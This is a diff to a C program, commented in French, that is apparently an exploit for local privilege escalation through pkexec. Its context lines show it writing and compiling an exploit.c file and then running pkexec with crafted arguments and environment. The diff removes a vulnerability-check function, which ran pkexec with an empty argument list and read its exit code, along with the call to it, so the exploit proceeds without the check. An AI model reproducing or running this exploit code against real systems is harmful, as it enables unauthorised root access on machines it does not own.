@@ -96,46 +96,6 @@ void iconv_open()
   }
 }
 
-void checkVulnerability()
-{
-  // Le processus principal (appelé le processus père) crée un nouveau processus enfant
-  pid_t pid = fork();
-
-  if (pid == 0)
-  {
-    int fd = open("/dev/null", O_WRONLY);
-    dup2(fd, 1);
-    dup2(fd, 2);
-    execve("/usr/bin/pkexec", (char *[]){NULL}, NULL);
-  }
-
-  else
-  {
-    int status;
-    waitpid(pid, &status, 0);
-
-    //  Lorsque le processus enfant s'est terminé, la fonction WIFEXITED() est utilisée pour vérifier si l'exécution s'est terminée
-    // normalement, et la fonction WEXITSTATUS() est utilisée pour obtenir le code de sortie du processus enfant.
-    if (WIFEXITED(status))
-    {
-      int exit_status = WEXITSTATUS(status);
-
-      // Si le code de sortie est égal à 1, cela signifie que le système n'est pas vulnérable,
-      if (exit_status == 1)
-      {
-        puts("Your system is not vulnerable");
-        exit(0);
-      }
-
-      // Sinon, cela signifie que le système est vulnérable,
-      else
-      {
-        puts("Your system is vulnerable\n");
-      }
-    }
-  }
-}
-
 int main(int argc, char *argv[])
 {
   // Créer un pointeur de fichier pour écrire dans le fichier exploit.c
@@ -155,8 +115,6 @@ int main(int argc, char *argv[])
   iconv_open();
 
   compileExploit();
-
-  checkVulnerability();
 
   // Si le système est vulnérable à l'exploit, exécuter pkexec en utilisant les
   // arguments a_argv et les variables d'environnement a_envp.
